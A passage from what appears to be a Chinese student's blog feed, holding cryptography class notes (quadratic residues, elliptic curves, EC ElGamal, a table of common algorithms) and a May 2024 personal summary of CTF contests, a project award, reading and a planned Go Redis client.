</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{(p-1)/2}\equiv 1 \bmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span></p><p>a是p的非平方剩余的充要条件是：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>≡</mo><mo>−</mo><mn>1</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{(p-1)/2}\equiv -1 \bmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span></p><p>例：p=23，a=5， 𝑎(𝑝−1)/2 ≡ 5^11 mod 23 = −1</p><p>所以，5不是模23的平方剩余。</p></blockquote><h4 id="有限域gf2m上的椭圆曲线"><a class="markdownIt-Anchor" href="#有限域gf2m上的椭圆曲线"></a> 有限域GF(2<sup>m</sup>)上的椭圆曲线</h4><p>是对于固定的<em>a</em>、<em>b</em>值，满足形如方程：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mi>y</mi><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">y^2+xy=x^3+ax^2+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span></p><p>的所有点(<em>x</em>, <em>y</em>)的集合，外加一个无穷远点<em>O</em>。其中a、b、x和y均在有限域GF(2<sup>m</sup>)上取值</p><ul><li>这类椭圆曲线通常也可用𝐸<sub>2^𝑚</sub>(a,b)来表示。</li><li>该椭圆曲线只有有限个点，域GF(2<sup>m</sup>)上的元素是m位的二进制串</li></ul><h5 id="计算-2"><a class="markdownIt-Anchor" href="#计算-2"></a> 计算</h5><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606084648275.png" alt="image-20240606084648275" style="zoom: 50%;" /><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606084652100.png" alt="image-20240606084652100" style="zoom:50%;" /><h3 id="运算规则"><a class="markdownIt-Anchor" href="#运算规则"></a> 运算规则</h3><ul><li>加法规则1：O+O=O</li><li>加法规则2：对于曲线上的所有点P满足P+O=P</li><li>加法规则3：对于每一个点P有一个特殊点Q满足：P+Q=O，称这个特殊点为-P。如果P=(x, y)，则-P=(x, -y)<ul><li>GF(2<sup>m</sup>)域加法规则3：如果P=(x, y)，则-P=(x, x+y)</li></ul></li><li>加法规则4：加法交换律P+Q=Q+P</li><li>加法规则5：加法结合律P+(Q+R)=(P+Q)+R</li></ul><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606083935459.png" alt="image-20240606083935459" style="zoom:50%;" /><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606083953668.png" alt="image-20240606083953668" style="zoom:50%;" /><p>以上加法规则在复数、实数、有理数和有限域GF(<em>p</em>)上均有效。对于有限域GF(<em>p</em>)的情形，上述加法规则得到的应是mod <em>p</em>的结果。</p><p>对于GF(2<sup>m</sup>)域的椭圆曲线，有规则6’，7’：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606084329142.png" alt="image-20240606084329142" style="zoom:50%;" /><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606084344567.png" alt="image-20240606084344567" style="zoom:50%;" /><h3 id="加密"><a class="markdownIt-Anchor" href="#加密"></a> 加密</h3><p>椭圆曲线密码体制的依据就是利用定义在椭圆曲线点群上的离散对数问题的难解性。</p><p>椭圆曲线𝐸上的交换群上考虑方程𝑃 = 𝑑𝐺，其中𝑃, 𝐺 ∈ 𝐸，𝑑为整数，则由𝑑和𝐺易求𝑃，但由𝑃、𝐺求 𝑑是计算上不可行的</p><p>ECELG——椭圆曲线ElGamal密码体制</p><ol><li><p>系统建立</p><p>选择一个有限域GF(<em>p</em>)，和定义在GF(<em>p</em>)上的一条椭圆曲线E<sub>p</sub>(a,b)，和E<sub>p</sub>(a,b)上的一个阶为大素数n的点G（称为基点）。椭圆曲线E<sub>p</sub>(a,b)、基点G和阶n作为系统公开参数</p></li><li><p>生成密钥</p><p>用户A通过如下计算产生自己的公私钥对<br />（1）在区间[1,n-1]中随机选取一个整数d<sub>A</sub>作为私钥<br />（2）计算P<sub>A</sub>=d<sub>A</sub>×G<br />则用户A的公钥为P<sub>A</sub> ，私钥为d<sub>A</sub></p></li><li><p>加密</p><p>当用户B要将消息m保密发送给用户A时，用户B进行如下操作：</p><ol><li>通过某种方式将明文消息m通过编码映射到曲线E<sub>p</sub>(a,b)上的点P<sub>m</sub></li><li>在区间[1,n-1]中随机选取一个整数d<sub>B</sub>作为私钥</li><li>计算P<sub>B</sub>=d<sub>B</sub>×G，并向用户A发送密文(P<sub>B</sub>, P<sub>m</sub> + d<sub>B</sub>× P<sub>A</sub>)</li></ol></li><li><p>解密</p><p>用户A收到密文进行解密，过程如下：<br />(P<sub>m</sub> + d<sub>B</sub>× P<sub>A</sub>) - d<sub>A</sub>× P<sub>B</sub></p></li></ol><p>验证：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">(</mo><msub><mi>P</mi><mi>m</mi></msub><mo>+</mo><msub><mi>d</mi><mi mathvariant="normal">B</mi></msub><mo>×</mo><msub><mi>P</mi><mi mathvariant="normal">A</mi></msub><mo fence="true">)</mo></mrow><mo>−</mo><msub><mi>d</mi><mi mathvariant="normal">A</mi></msub><mo>×</mo><msub><mi>P</mi><mi mathvariant="normal">B</mi></msub><mo>=</mo><msub><mi>P</mi><mi>m</mi></msub><mo>+</mo><msub><mi>d</mi><mi mathvariant="normal">B</mi></msub><mo>×</mo><msub><mi>d</mi><mi mathvariant="normal">A</mi></msub><mo>×</mo><mi>G</mi><mo>−</mo><msub><mi>d</mi><mi mathvariant="normal">A</mi></msub><mo>×</mo><msub><mi>d</mi><mi mathvariant="normal">B</mi></msub><mo>×</mo><mi>G</mi><mo>=</mo><msub><mi>P</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">\left(P_{m}+d_{\mathrm{B}} \times P_{\mathrm{A}}\right)-d_{\mathrm{A}} \times P_{\mathrm{B}}=P_{m}+d_{\mathrm{B}} \times d_{\mathrm{A}} \times G-d_{\mathrm{A}} \times d_{\mathrm{B}} \times G=P_{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">A</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">B</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>关于明文到椭圆曲线上的嵌入：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240605213121828.png" alt="image-20240605213121828" style="zoom:50%;" /><h3 id="例题-3"><a class="markdownIt-Anchor" href="#例题-3"></a> 例题</h3><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240606084509649.png" alt="image-20240606084509649" style="zoom:80%;" /><h2 id="常见加密算法及其数学基础"><a class="markdownIt-Anchor" href="#常见加密算法及其数学基础"></a> 常见加密算法及其数学基础</h2><table><thead><tr><th>加密算法</th><th>类型</th><th>数学基础</th><th>描述</th></tr></thead><tbody><tr><td><strong>AES</strong></td><td>对称加密</td><td>有限域上的代数操作</td><td>使用字节替代、行移位、列混淆和轮密钥加的多轮变换。</td></tr><tr><td><strong>DES</strong></td><td>对称加密</td><td>Feistel 网络和置换操作</td><td>基于 Feistel 结构，通过多轮置换和替换操作来加密数据。</td></tr><tr><td><strong>RSA</strong></td><td>非对称加密</td><td>大整数的质因数分解</td><td>基于两个大质数的乘积构成的模数和一个公开的指数。</td></tr><tr><td><strong>ECC</strong></td><td>非对称加密</td><td>椭圆曲线上的离散对数问题</td><td>使用椭圆曲线上的点和曲线方程来生成公钥和私钥。</td></tr><tr><td><strong>DSA</strong></td><td>非对称加密</td><td>离散对数问题</td><td>使用一组公开参数和一个私钥来生成和验证签名。</td></tr><tr><td><strong>ElGamal</strong></td><td>非对称加密</td><td>离散对数问题</td><td>基于离散对数问题，通过使用一个随机数和一个公钥来加密消息。</td></tr><tr><td><strong>SHA-256</strong></td><td>哈希函数</td><td>位操作和逻辑运算</td><td>通过多个复杂的位操作、替换和压缩函数生成固定长度的散列值。</td></tr><tr><td><strong>MD5</strong></td><td>哈希函数</td><td>位操作和逻辑运算</td><td>使用多个固定的位操作和压缩函数生成固定长度的散列值。</td></tr><tr><td><strong>Diffie-Hellman</strong></td><td>密钥交换</td><td>离散对数问题</td><td>基于离散对数问题，允许两个通信方生成共享的秘密密钥。</td></tr><tr><td><strong>zk-SNARKs</strong></td><td>零知识证明</td><td>多项式承诺和同态加密</td><td>允许一个方证明其拥有某个秘密信息而不透露该信息本身。</td></tr></tbody></table><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/116586172_p0.jpg" alt="116586172_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数论 </tag>
            
            <tag> 密码学 </tag>
            
            <tag> Diffie-Hellman </tag>
            
            <tag> RSA </tag>
            
            <tag> 椭圆曲线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5月总结·2024</title>
      <link href="/posts/3a0e8080d50f/"/>
      <url>/posts/3a0e8080d50f/</url>
      
        <content type="html"><![CDATA[<h1 id="5月总结2024"><a class="markdownIt-Anchor" href="#5月总结2024"></a> 5月总结·2024</h1><p>5月也算是过去了，这绝对是我大学以来最忙碌的一个月份。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/cc7914d2e08d6d1311b9952c5d026ba.jpg" alt="cc7914d2e08d6d1311b9952c5d026ba" style="zoom: 33%;" /><p>看看这令人发指的日程表，除了开头的五一假期外所有周末全部阵亡；；</p><p>那么，就来回顾一下我在五月份都做了些什么吧。</p><h2 id="比赛篇"><a class="markdownIt-Anchor" href="#比赛篇"></a> 比赛篇</h2><h3 id="广东省信息安全省赛"><a class="markdownIt-Anchor" href="#广东省信息安全省赛"></a> 广东省信息安全省赛</h3><p>小打了一手省赛。命题机制十分抽象，分为知识赛和常规CTF两个阶段，根本不知道意义何在。知识赛的目的我怀疑就是给拿来py的，虽然电脑都有录屏，但是手机可以查啊……于是在第一个周六的晚上水过了知识赛后，第一个周日开始打CTF。</p><p>CTF也是非同凡响，一上来就给了所有人一个下马威：比赛平台因为访问量太大直接崩溃了一个半小时，可能省赛的服务器是用土豆搭的。于是乎比赛录屏就录下了我们打了一个小时力扣、知乎、甚至第五人格。最后开放试题后题目质量也是不负众望延续了抽象本色。我是做Web的，只拿下了一道文件包含。第二道题是关于phar压缩包反序列化的，找修改压缩包的脚本花费了大量时间差临门一脚就能出来了。剩下的三道题目全是零解，但是在比赛即将结束的前5分钟提交数却猛然上升最后达到了差不多一百余位……很难不怀疑比赛主办方是否在py题目。</p><p>据说逆向也是相当抽象，听打逆向的队友说题目反编译后直接把一个谜题打印出来要你去解，与其说叫Re更不如说是Misc，气的队友破口大骂了一个下午。</p><p>总之最后的结果也是喜闻乐见，大家都没有进决赛：）。</p><h3 id="全国大学生信息安全竞赛-ciscn-2024"><a class="markdownIt-Anchor" href="#全国大学生信息安全竞赛-ciscn-2024"></a> 全国大学生信息安全竞赛 CISCN 2024</h3><p>第二个周末，小试了一手国赛，同样不能理解国赛的赛制，但好歹还是常规的CTF。这次是凭实力零解了，想来也在意料之中，平时本来也没有着重训练这方面，事后看完WP我也不认为我能够写出来那几道题，果然CTF这个方向还是不适合我吧。因为进入校队晚了一年已经成了替补位，得不到校队的资源倾斜和培养，基本上就是自生自灭的态度了。既然如此，也没必要在这一个方向死磕。果然我还是更适合传统的开发工作吧。</p><p>最后再吐槽一下Web的签到题，最讨厌这种几行php代码然后过滤一大堆指令的题目，有一种把手脚砍断去参加游泳比赛的美感。我个性又不叫不信邪，就是喜欢死磕，不过可惜到最后也没有做出来个所以然。这题大概有五六百个解吧，py肯定是有的，不过我也没做出来，就这样吧。</p><h3 id="广东省计算机程序设计大赛粤港澳赛区"><a class="markdownIt-Anchor" href="#广东省计算机程序设计大赛粤港澳赛区"></a> 广东省计算机程序设计大赛·粤港澳赛区</h3><p>准备了大概小一个月，我的主要工作就是完成了深度伪造检测攻击中的Auto Encoder部分和一些Flask的前端框架编写。我对人工智能这块实在是没有多少涉猎，但是抱着论文啃一啃也能搞点东西出来。毕竟这东西如果不涉及底层，只是使用的话上手门槛很低。</p><p>最后在第三个周末去广州外语外贸大学答辩。发现自己可能并不很适合去答辩，念着念着嗓子就容易哑，和这周一汇报毛概调研一样的状况。可能，是高中时期因为一些事情没保养好嗓子的缘故吧，只要长时间大声说话嗓子就会宕机（所以也很害怕去KTV）。念PPT的过程很煎熬，一方面是因为嗓子，一方面是因为队长没有对做PPT的同学交代好时间导致他做了20分钟的量，而我得在5分钟内读完。真的很考验语速和归纳能力。</p><p>不过所幸努力并没有白费，最后也是拿下了省一等奖。虽然说含金量并不大，因为我们这个赛道没有985下场（当时本来想报主赛道结果因为学校的种种逆天操作导致错过了作品提交时间），光从学校来看能扳扳手腕的也就只有深大了，所以拿下一等奖也并不意外。在这之后，同一个项目也入选了国家级大创，并且队长也同意把这个项目的软著一作给我。想必之后还有忙不完的事情吧。</p><h3 id="吴渔夫选拔赛"><a class="markdownIt-Anchor" href="#吴渔夫选拔赛"></a> 吴渔夫选拔赛</h3><p>同样的项目参加了学校组织的吴渔夫比赛，顺利拿下了二等奖和国家级大创入围资格。</p><h3 id="数学建模校赛"><a class="markdownIt-Anchor" href="#数学建模校赛"></a> 数学建模校赛</h3><p>一个学校组织的数学建模比赛，用来筛选参加今年数学建模国赛的。自从上次美赛后本来打算一辈子不碰数模的，但是架不住朋友的邀约还是选择了尝试一下，这次我就负责论文撰写（或许还有一部分的编程），建模部分交给了两位信计专业的队友，果然专业的事还得专业的人来做。</p><p>开讨论间讨论了一下四个选题，过程都十分坎坷。从个人角度来讲我对这次数模比赛本身也不报多大希望。</p><h2 id="书籍篇"><a class="markdownIt-Anchor" href="#书籍篇"></a> 书籍篇</h2><h3 id="go语言圣经"><a class="markdownIt-Anchor" href="#go语言圣经"></a> Go语言圣经</h3><p>说实话我的进度太慢了，这个月也就才阅读了一半，尤其是在阅读接口部分时卡住了。我没有系统的学过OOP，在C语言中不存在接口的概念，Python里也没有深入学习到抽象基类，因此第一次就是在Go中理解接口对我来说异常困难。不过在查阅过一些资料后，现在也能勉强理解。</p><p>哪怕按每天十页的进度来说，这本书也该在一个月内就啃完了。很显然我多数时间并没有完成预期目标，这点对我来说还是挺有挫败感的。我计划尽量在六月份把书的主体部分看完，至于一些细节的编程技巧可以再等到期末考试完后慢慢反刍。现在除了阅读书籍外，我也在尝试每天做几道LeetCode来加深对Go的理解，并且正准备用Go开发一个项目玩玩。</p><h3 id="罪与罚"><a class="markdownIt-Anchor" href="#罪与罚"></a> *罪与罚</h3><p>看了一半多，进度不大。目前还不想花太多篇幅写观后感，只要知道我还在看就行。吐槽一句我果然还不是很适应陀翁的书，这种大部头名著看起来其实挺耗精力的，在毛概读了没多会就头晕目眩直想睡觉了。</p><p>忙里偷闲赶紧看完，想去看《霍乱时期的爱情》了。</p><h3 id="結婚しても恋してる"><a class="markdownIt-Anchor" href="#結婚しても恋してる"></a> *結婚しても恋してる</h3><p>思来想去还是放日文好点吧。一本温馨幸福的书，就像一小块蓝莓口味的水果糖，用大概两个晚上的时间就读完了。</p><p>人呐，果然还是应该热忱的面对生活。</p><h2 id="项目篇"><a class="markdownIt-Anchor" href="#项目篇"></a> 项目篇</h2><h3 id="一个基于go的redis客户端"><a class="markdownIt-Anchor" href="#一个基于go的redis客户端"></a> 一个基于Go的Redis客户端</h3><p>正好舍友用Rust重写了一个Redis服务端，他也有兴趣指导我做一个Redis的客户端，于是乎就这么顺理成章的上马了。目前还只是在项目需求阶段，具体的知识还得自己去学。不说数据库和尚未学完的Go了，什么RESP3协议、TLS协议、RDB数据持久化、连接池、pipline、Lua都是些没接触过的新东西，我估计也要等到暑假才会正式开始启动吧。</p><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><h3 